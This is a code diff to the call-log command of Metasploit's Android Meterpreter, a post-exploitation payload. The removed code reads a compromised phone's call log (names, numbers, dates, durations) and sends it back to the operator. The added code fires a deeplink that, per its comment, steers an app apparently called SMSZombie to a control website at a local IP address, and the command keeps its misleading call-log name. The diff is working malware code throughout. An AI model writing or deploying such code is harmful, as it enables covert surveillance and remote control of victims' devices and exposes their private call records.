@@ -10,6 +10,18 @@ import com.metasploit.meterpreter.Meterpreter;
 import com.metasploit.meterpreter.TLVPacket;
 import com.metasploit.meterpreter.command.Command;
 
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.app.Activity;
+import android.content.Context;
+import android.net.Uri;
+import android.content.ActivityNotFoundException;
+import android.content.ComponentName;
+import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
+
 public class android_dump_calllog implements Command {
 
     private static final int TLV_EXTENSIONS = 20000;
@@ -34,49 +46,26 @@ public class android_dump_calllog implements Command {
     public int execute(Meterpreter meterpreter, TLVPacket request,
                        TLVPacket response) throws Exception {
 
-        Cursor cur = AndroidMeterpreter.getContext().getContentResolver()
-                .query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+        AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
+        final Context context = androidMeterpreter.getContext();
 
-        int number = cur.getColumnIndex(CallLog.Calls.NUMBER);
-        int type = cur.getColumnIndex(CallLog.Calls.TYPE);
-        int date = cur.getColumnIndex(CallLog.Calls.DATE);
-        int duration = cur.getColumnIndex(CallLog.Calls.DURATION);
-        int name = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
 
-        while (cur.moveToNext()) {
-            TLVPacket pckt = new TLVPacket();
 
-            pckt.addOverflow(TLV_TYPE_CALLLOG_NAME, cur.getString(name));
-            pckt.addOverflow(TLV_TYPE_CALLLOG_NUMBER, cur.getString(number));
-            pckt.addOverflow(TLV_TYPE_CALLLOG_DURATION, cur.getString(duration));
+       /* Android Q poses limitations on starting activities
+        *
+        * https://developer.android.com/guide/components/activities/background-starts
+        */
 
-            String callDate = cur.getString(date);
-            Date callDayTime = new Date(Long.valueOf(callDate));
+        // Starts intent with deeplink to navigate SMSZombie's WebView to control website
+        try {
+            Intent intent = new Intent("android.intent.action.VIEW",
+                        Uri.parse("walkingdead://callzombie/?url=http://192.168.1.134:1313"));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
 
-            pckt.addOverflow(TLV_TYPE_CALLLOG_DATE, callDayTime.toString());
-
-            String callType = cur.getString(type);
-            String dir = unknown;
-
-            int dircode = Integer.parseInt(callType);
-            switch (dircode) {
-                case CallLog.Calls.OUTGOING_TYPE:
-                    dir = outgoing;
-                    break;
-
-                case CallLog.Calls.INCOMING_TYPE:
-                    dir = incoming;
-                    break;
-
-                case CallLog.Calls.MISSED_TYPE:
-                    dir = missed;
-                    break;
-            }
-            pckt.addOverflow(TLV_TYPE_CALLLOG_TYPE, dir);
-            response.addOverflow(TLV_TYPE_CALLLOG_GROUP, pckt);
+        } catch (ActivityNotFoundException e) {
+          return ERROR_FAILURE;
         }
-
-        cur.close();
 
         return ERROR_SUCCESS;
     }
